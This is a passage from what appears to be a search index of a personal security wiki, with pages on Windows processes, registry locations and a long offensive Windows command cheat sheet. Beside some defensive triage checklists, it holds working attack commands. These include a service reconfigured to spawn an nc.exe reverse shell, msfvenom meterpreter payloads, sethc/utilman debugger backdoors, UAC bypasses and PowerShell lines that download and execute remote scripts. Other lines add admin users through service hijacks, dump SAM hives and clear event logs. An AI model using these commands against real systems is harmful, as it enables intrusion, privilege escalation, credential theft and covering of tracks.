NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process.","title":"WINLOGON.EXE - Windows Logon Process"},{"location":"os/windows/important-processes/#explorerexe-aka-windows-explorer","text":"No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here.","title":"Explorer.exe - AKA Windows Explorer"},{"location":"os/windows/important-processes/#checklist","text":"Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc.","title":"Checklist"},{"location":"os/windows/important-processes/#references","text":"Ref: http://sysforensics.org/2014/01/know-your-windows-processes . Link is not longer working. Ref: https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf","title":"References"},{"location":"os/windows/important-reg-locations/","text":"Important Registry Locations Installed programs: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Uninstall Gain system shell at login using 5x[shift]: HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ sethc . exe with property Debugger set to cmd . exe HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ utilman . exe with property Debugger set to cmd . exe Disable macro security: Enable EDP: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f Ways to access registry cmd: cmd / c REG QUERY Powershell: Get - Item path For remote use: Enter - PSSession and inside the session use Get - Item WMI (StdRegProv) To find IDs use: https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1 $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) .Net [ Microsoft . Win32 . RegistryKey ]. getMethods () https://archive.codeplex.com/?p=psremoteregistry Tasks Recently used commands Installed apps Turn off network level auth Attach debugger to setg.exe","title":"Important Registry Locations"},{"location":"os/windows/important-reg-locations/#important-registry-locations","text":"Installed programs: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Uninstall Gain system shell at login using 5x[shift]: HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ sethc . exe with property Debugger set to cmd . exe HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ utilman . exe with property Debugger set to cmd . exe Disable macro security: Enable EDP: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f","title":"Important Registry Locations"},{"location":"os/windows/important-reg-locations/#ways-to-access-registry","text":"cmd: cmd / c REG QUERY Powershell: Get - Item path For remote use: Enter - PSSession and inside the session use Get - Item WMI (StdRegProv) To find IDs use: https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1 $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) .Net [ Microsoft . Win32 . RegistryKey ]. getMethods () https://archive.codeplex.com/?p=psremoteregistry","title":"Ways to access registry"},{"location":"os/windows/important-reg-locations/#tasks","text":"Recently used commands Installed apps Turn off network level auth Attach debugger to setg.exe","title":"Tasks"},{"location":"os/windows/kernel-exploitation/","text":"Kernel Exploitation References Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849","title":"Kernel Exploitation"},{"location":"os/windows/kernel-exploitation/#kernel-exploitation","text":"","title":"Kernel Exploitation"},{"location":"os/windows/kernel-exploitation/#references","text":"Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849","title":"References"},{"location":"os/windows/mix/","text":"WINDOWS COMMANDS BASIC systeminfo hostname whoami whoami /all echo %username% ipconfig /all route print netstat -ntlp -listening ports netstat -bano netsat -r -routing table command | findstr /C:\"str\" -grep echo %userdomain% echo %path% shutdown /r start explorer -execute path builtin program (same as input to win+r) env set path -print currently defined execution path setx c:\\Program Files(x86)\\bin\\ -append target directory to currently defined execution path runas /profile /user:administrator \"C:\\absolute\\path\\pcoff.exe\" -run target \"executable\" with user profile permissiosn for /user: --*should prompt for target user's password START /B process.exe run code excution in background for %%i in (C:\\abs\\path*) do %%i OR for /F \"usebackq\" %i in ( dir / b C : \\ macros \\ Day \\ ) DO %i -execute all files in a directory Auto-Start Directories Windows NT 6.1,6.0 %SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ Windows NT 5.2, 5.1, 5,0 %SystemDrive%\\Documents And Settings\\All Users\\Start Menu\\Programs\\StartUp\\ Windows 9x %SystemDrive%\\wmiOWS\\Start Menu\\Programs\\StartUp\\ Windows NT 4.0, 3.51, 3.50 %SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\StartUp\\ FILESYSTEM type file -print file dir /s pass == cred == vnc == .config dir /s /b | find /I \u201csearchstring\u201d findstr /si password *.xml *.ini *.txt fsutil fsinfo drives -list drives currently on the system --requires admin privs assoc -print returned list of file extension associations assoc .ps1=powershellfile ftype powershellfile=\"%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\" -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with dir /a-r-d /s /b -check directory for writeable files powershell Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern \"everyone\" -check for world-writeable files File Transfer iexplore.exe http://blah.com/filename.zip C:\\windows\\explorer.exe http://somewhere.com/filename.ext ftp ftp.site.dom USERS whoami net users net user /domain -list users in current domain net user username -list user info net user name pass /add -add local system user net user user_name * /domain -add user to domain with interactive prompt for password net user name setpword net user /DOMAIN %USERNAME% -check user's network group membership net user /domain user -check another user's information net group \"Domain Users\" /domain -list users in AD group net localgroup \"administrators\" /domain -list domain local group users net group \u201cDomain Admins\u201d /domain net group \u201cEnterprise Admins\u201d /domain net group \u201cDomain Controllers\u201d /domain NET LOCALGROUP \"Remote Desktop Users\" trinity /ADD net accounts -prints password policy for locahost net accounts /domain dsmod user /? -get dsmod commands cruft dsmod user administrator -pwd NewPassword -mustchpwd yes -modify user password, set pwExpired flag NETWORK arp -A net view -view available network share hosts net view \\HOST -view available shares on host net view /domain:otherdomain Queries NBNS/SMB (SAMBA) and tries to find all hosts in \u2018otherdomain\u2019 tasklist /V /S computername qwinsta /SERVER:computername qprocess /SERVER:computername * net use \\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed dir \\computername\\share_or_admin_share\\ net use \\computer\\share -mount an smb share net use X: \\10.2.2.224\\C$ net use * http//hostname/nfs/ pword /USER:username net share name=c:\\path\\to\\share -create smb share net share name=c:\\path\\to\\share /GRANT:Everyone,FULL -make an smb share world-accessable pushd \\10.2.2.224\\C$ -mount remote file share to automatically mapped drive cacls c:\\path /T /E /G user:f -grant user full file access control from path tasklist /V /S computername Lists tasks w/users running those tasks on a remote system netsh firewall show state netsh firewall show config netsh firewall set opmode disable netsh advfirewall firewall set rule group=\"windows management instrumentation (wmi)\" new enable=yes -enable remote wmi netsh interface ip set address local dhcp -configure nic to user dhcp netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 -open port (for rdesktop) netsh advfirewall firewall add rule name=\"Block mssql attack ips\" dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213 -close port (for rdesktop) netsh advfirewall set allprofiles state off netsh wlan show profiles -shows all saved wireless profiles netsh wlan export profile folder=. key=clear exports a user wifi profile with the password in plaintext to an xml file in the current working directory netsh wlan [start|stop] hostednetwork Starts or stops a wireless backdoor on a windows 7 pc netsh wlan set hostednetwork ssid= key= keyUsage=persistent|temporary Complete hosted network setup for creating a wireless backdoor on win 7 netsh wlan set hostednetwork mode=[allow|disallow] netdom query trust /Domain:dnsname OR nltest /domain_trusts /All_Trusts SERVICES/PROCESSES/PERMISSIONS configuration tasklist tasklist /SVC taskkill net start -list all running services sc [stop|start] service sc qc service -view configuration of a service - sc config upnphost binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\" - sc config upnphost obj= \".\\LocalSystem\" password= \"\" - net start upnphost sc query sc queryex schtasks /query /fo LIST /v net start RpcSs net stop RpcSs -start stop rpc service on localhost c:\\windows\\system32\\gathernetworkinfo.vbs (Windows 7)Included script with, enumerates builtin config information pkgmgr /iu:\"TelnetServer\" pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel (On Vista) install update or uninstall update builtin process icacls \"dir\\\" -check the file permissions of a folder WMIC WINDOWS MANAGEMENT INSTRUMENTATION **default xp configuration does not allow low priv(non-members of administrators group) to wmic; w by default allow access to low priv users https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/ http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/ QUERIES SELECT [Class property name|*] FROM [CLASS NAME] SELECT * FROM Win32_Process WHERE Name LIKE \u201c%chrome%\u201d -wmic instance query INFORMATION wmic /? WMIC enable (remote) wmic startupwmic service -start remote wmi service netsh firewall set service RemoteAdmin enable netsh advfirewall firewall set rule group=\"windows management instrumentation (wmi)\" new enable=yes -make exception in firewall for remote wmic service HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM\\CIMOM\\AllowAnonymousCallback Get-WmiObject -Namespace \"root\\cimv2\" -Class Win32_LogicalDisk -ComputerName -Credential -test remote wmi access ENUMERATION wmic qfe -patch level information wmic qfe get -list patching information for localhost wmic qfe qfe hotfixid wmic qfe get Caption,Description,HotFixID,InstalledOn\\ -get windows patch level information wmic process list full -list all attributes of all running processes wmic process get caption,executablepath,commandline wmic process call create \u201cprogram\u201d wmic process where name=\u201cprogram\u201d call terminate -kill target program wmic process get caption,executablepath,commandline /format:csv wmic useraccount wmic useraccount get /ALL wmic useraccount where name='uname' get sid wmic useraccount where sid='S-1-3-12-1234525106-3567804255-30012867-1437' get name wmic useraccount where (name='administrator' and domain='%computername%') get name,sid -get name/sid for system admin wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid -get name/sid for domain admin wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\" -check for trusted service paths(privesc) wmic get /ALL /format:csv wmic share get /ALL -list smb shares wmic logicaldisk get name wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber wmic start list full -list startup programs wmic computersystem get domain wmic ntdomain list -domain and DC info PRIVESC enumeration wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\" -find unquote service path REGISTRY *note HKLM keys are for HKey local machine registry *HKCU keys are for HKey current user registry entries reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated -together allow users of any privilege level to install *.msi files as NT AUTHORITY\\SYSTEM reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f -enable RDP reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s -grep the registry for key word \"password\" REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs\" /v Start /t REG_DWORD /d 2 /f -change startup type for rpc service to automatic REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs\" /v Start /t REG_DWORD /d 4 /f -change startup type for rpc service to disabled reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\Current ControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f reg query HKLM /s /d /f \"C:* *.exe\" | find /I \"C:\\\" | find /V \"\"\"\" -(win7) curely registered executables within the system registry reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" -windows autologin reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" -vnc stored password reg query\" HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" -putty cleartext credentials reg save HKLM\\Security security.hive --save security.hive reg save HKLM\\System system.hive --save system hive to file reg save HKLM\\SAM sam.hive --save sam to file reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe\" /f START /W CompMgmtLauncher.exe reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f -UAC bypass for win /10 reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /d \"cmd.exe\" /f START /W sdclt.exe reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /f -UAC bypass for win 10 START Administrative Tools Server Manager Features Add Features Administrative Tools Windows Powershell -enable powershell on machine POWERSHELL syntax (from cmd.exe, where installed): Special Characters \" The beginning (or end) of quoted text The beginning of a comment $ The beginning of a variable Reserved for future use ( ) Parentheses used for subexpressions ; Statement separator { } Script block | Pipeline separator ` Escape character .\\Powershell.exe -command attrib +R c:\\path\\to\\file.txt $var = \"hello\" Powershell.exe -command Get-HotFix -check Windows patch level Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetUser -display all AD users Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-UserProperties -Properties name,memberof,description,info -return AD user proprietary information set-ItemProperty -Path 'HKLM:\\System\\Current\\ControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0 -format for making registry queries from powershell --enable RDP on target hostname Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" -enable existing firewall rule, e.g. RDP allow powershell.exe -command New-NetFirewallRule -DisplayName \"Allow Inbound Port 80\" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow -create new firewall rule set to allow --to create a block rule set -Action Block powershell.exe -command Get-Service -show all services powershell.exe -command Restart-Service -restart target service powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias \"Ethernet\" -ServerAddresses 8.8.8.8 -Configure the DNS Server (to 8.8.8.8/Google) powershell.exe -command Get-Process -return a process listing Start-Job { 'C:\\bin\\hashcat\\bin\\hashcat64.exe' } -Name cracker bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\\Path\\to\\outfile.ext -download a file ACTIVE DIRECTORY cmdlets Get-Job -State Stop-Job cracker Get-Command text Get-Command -Verb Get Get-Command -Noun Service Get-Help Get-Command (-Detailed,-Full,-Examples,-Online) OR Get-Command -? Get-SmbServerConfiguration Set-SmbServerConfiguration -EnableSMB1Protocol $true Get-ChildItem -Path C:\\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetComputers -return listing of hosts in Active Directory Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-Information -return information collected on sys,reg, c Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -search network for hosts in use by Domain Admin(s) Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -UserName \"admin\" -search network for host user \"admin\" is on get-aduser -filter {name -like \"krbtgt*\"} -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1 -get information for krbtgt active directory domain account Get-ADForest | Select Domains -enum domains in an AD forest Get-ADDomain | FL NetBIOSName -get netbios name of an AD domain Get-ADTrust -filter * Powershell x WMIC wmic.exe Powershell WMI cmdlets -- Get-WmiObject -- Get-CimAssociatedInstance -- Get-CimClass -- Get-CimInstance -- Get-CimSession -- Set-WmiInstance -- Set-CimInstance -- Invoke-WmiMethod -- Invoke-CimMethod -- New-CimInstance -- New-CimSession -- New-CimSessionOption -- Register-CimIndicationEvent -- Register-WmiEvent -- Remove-CimInstance -- Remove-WmiObject -- Remove-CimSession Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential \u2018WIN-B85AAA7ST4U\\Administrator' Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct -av detection SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory 2147483648 SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors 2 SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE \u201c%VMware%\u201d SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE \u201c%VMware%\u201d SELECT * FROM Win32_Process WHERE Name=\u201dvmtoolsd.exe\u201d SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE \u201c%VMware%\u201d -vm detection Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \u2018notepad.exe\u2019 -code execution, like psexec but stealthier SYSINTERNALS PSEXEC psexec /? psexec -accepteula psexec \\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0 psexec \\10.2.2.23 netsh firewall set service remoteadmin enable psexec \\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable CLEANUP wevtutil el -list logs wevtutil cl log.log -clear specific lowbadming del %WINFRT%*.log /a /s /q /f ADVANCED DRIVERQUERY LOCAL EXPLOITS KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799) -patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008 KB2503665: patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp , server 2008 sp , 7 (sp0/1) Table of patch replacements: | MS11-046 | MS11-080 | MS12-009 | MS13-093 | MS14-040 | ------------------------------------------------------------- | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 | ----------------------------------------------------------------------------------------- Windows x86 XP SP3 | Installed | -Replaces| - | - | - | Windows x86 Server 2003 SP2 | Installed | -Replaces| -Replaces| - | -Replaces| Windows x86 Vista SP1 | Installed | - | - | - | - | Windows x86 Vista SP2 | Installed | - | - | - | -Replaces| Windows x86 Server 2008 | Installed | - | - | - | - | Windows x86 Server 2008 SP2 | Installed | - | - | - | -Replaces| Windows x86 7 | Installed | - | - | - | - | Windows x86 7 SP1 | Installed | - | - | - | -Replaces| Policy files (may contain passwords) SYSVOL/(../)Groups.xml Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes Configuration files commonly left behind by mass rollouts/older (pre-)devops c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml Trusted Service Paths exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\" icacls \"C:\\Program Files (x86)\\Target\" msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe -now replace Target\\target.exe with payload sc stop target sc start target -now the reverse shell should be spawned as privileged user Vulnerable Services exploit/windows/local/service_permissions accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula sc qc target sc config target binpath= \"net user hacker P@ssword123! /add\" sc stop target sc start target sc config target binpath= \"net localgroup Administrators hacker /add\" sc stop target sc start target -errors may occur starting service, but only after commands are executed AlwaysInstallElevated exploit/windows/local/always_install_elevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi msiexec /quiet /qn /i C:\\Users\\User\\Downloads\\exploit.msi DLL Injection msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe WIN filesystem read targets tier 1 %SYSTEMDRIVE%\\boot.ini near ubiquitous, confirmation that a read is happening %WINDIR%\\win.ini second test file if boot.ini cannot be found/returned %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM stores users' passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \\repair is locked, but can be retired using forensic or Volume Shadow copy methods %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system key to read SAM hashes in plaintext without cracking %WINDIR%\\repair\\security %SYSTEMDRIVE%\\autoexec.bat TIER 1, LOCATION NOT SET BY DEFAULT unattend.txt unattend.xml sysprep.inf --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location. tier 2 %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\software %WINDIR%\\iis6.log (or 5 or 7, given version) %WINDIR%\\system32\\logfiles\\httperr\\httperr1.log --iis6 error log %SystemDrive%\\inetpub\\logs\\LogFiles --IIS 7\u2019s logs location %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS 1\\Tempor 1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts references http://www.fuzzysecurity.com/tutorials/16.html https://www.toshellandback.com/2015/11/24/ms-priv-esc/ https://pastebin.com/FehvXsEZ https://pastebin.com/HvKs18zh","title":"Mix"},{"location":"os/windows/mix/#the-beginning-of-a-comment","text":"$ The beginning of a variable Reserved for future use ( ) Parentheses used for subexpressions ; Statement separator { } Script block | Pipeline separator ` Escape character .\\Powershell.exe -command attrib +R c:\\path\\to\\file.txt $var = \"hello\" Powershell.exe -command Get-HotFix -check Windows patch level Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetUser -display all AD users Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-UserProperties -Properties name,memberof,description,info -return AD user proprietary information set-ItemProperty -Path 'HKLM:\\System\\Current\\ControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0 -format for making registry queries from powershell --enable RDP on target hostname Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" -enable existing firewall rule, e.g. RDP allow powershell.exe -command New-NetFirewallRule -DisplayName \"Allow Inbound Port 80\" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow -create new firewall rule set to allow --to create a block rule set -Action Block powershell.exe -command Get-Service -show all services powershell.exe -command Restart-Service -restart target service powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias \"Ethernet\" -ServerAddresses 8.8.8.8 -Configure the DNS Server (to 8.8.8.8/Google) powershell.exe -command Get-Process -return a process listing Start-Job { 'C:\\bin\\hashcat\\bin\\hashcat64.exe' } -Name cracker bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\\Path\\to\\outfile.ext -download a file ACTIVE DIRECTORY cmdlets Get-Job -State Stop-Job cracker Get-Command text Get-Command -Verb Get Get-Command -Noun Service Get-Help Get-Command (-Detailed,-Full,-Examples,-Online) OR Get-Command -? Get-SmbServerConfiguration Set-SmbServerConfiguration -EnableSMB1Protocol $true Get-ChildItem -Path C:\\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetComputers -return listing of hosts in Active Directory Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-Information -return information collected on sys,reg, c Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -search network for hosts in use by Domain Admin(s) Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(' https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -UserName \"admin\" -search network for host user \"admin\" is on get-aduser -filter {name -like \"krbtgt*\"} -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1 -get information for krbtgt active directory domain account Get-ADForest | Select Domains -enum domains in an AD forest Get-ADDomain | FL NetBIOSName -get netbios name of an AD domain Get-ADTrust -filter * Powershell x WMIC wmic.exe Powershell WMI cmdlets -- Get-WmiObject -- Get-CimAssociatedInstance -- Get-CimClass -- Get-CimInstance -- Get-CimSession -- Set-WmiInstance -- Set-CimInstance -- Invoke-WmiMethod -- Invoke-CimMethod -- New-CimInstance -- New-CimSession -- New-CimSessionOption -- Register-CimIndicationEvent -- Register-WmiEvent -- Remove-CimInstance -- Remove-WmiObject -- Remove-CimSession Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential \u2018WIN-B85AAA7ST4U\\Administrator' Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct -av detection SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory 2147483648 SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors 2 SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE \u201c%VMware%\u201d SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE \u201c%VMware%\u201d SELECT * FROM Win32_Process WHERE Name=\u201dvmtoolsd.exe\u201d SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE \u201c%VMware%\u201d -vm detection Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \u2018notepad.exe\u2019 -code execution, like psexec but stealthier SYSINTERNALS PSEXEC psexec /? psexec -accepteula psexec \\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0 psexec \\10.2.2.23 netsh firewall set service remoteadmin enable psexec \\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable CLEANUP wevtutil el -list logs wevtutil cl log.log -clear specific lowbadming del %WINFRT%*.log /a /s /q /f ADVANCED DRIVERQUERY LOCAL EXPLOITS KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799) -patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008 KB2503665: patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp , server 2008 sp , 7 